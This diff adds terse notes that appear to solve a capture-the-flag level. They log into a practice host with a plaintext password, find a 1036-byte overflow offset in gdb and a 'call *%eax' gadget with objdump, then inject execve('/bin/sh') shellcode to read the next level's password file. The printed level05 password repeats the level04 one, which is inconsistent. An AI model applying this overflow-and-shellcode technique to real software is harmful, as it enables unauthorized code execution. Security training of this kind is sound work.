@@ -1,0 +1,17 @@
+$ ssh level04@ctf.stri.pe
+	Password: i5cBbPvPCpcP
+
+$ gdb /levels/level04
+(gdb) run `perl -e 'print "\x90" x 1036 . "\xef\xbe\xad\xde"'`
+(gdb) info registers
+	ebp            0x90909090	0x90909090
+	eip            0xdeadbeef	0xdeadbeef
+
+$ objdump -S /levels/level04
+	08048460 <frame_dummy>:
+	 804847f:	ff d0                	call   *%eax
+
+$ /levels/level04 `perl -e 'print "\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x99\x52\x53\x89\xe1\xb0\x0b\xcd\x80" . "\x90" x 1012 . "\x7f\x84\x04\x08"'`
+
+$ cat /home/level05/.password
+	i5cBbPvPCpcP
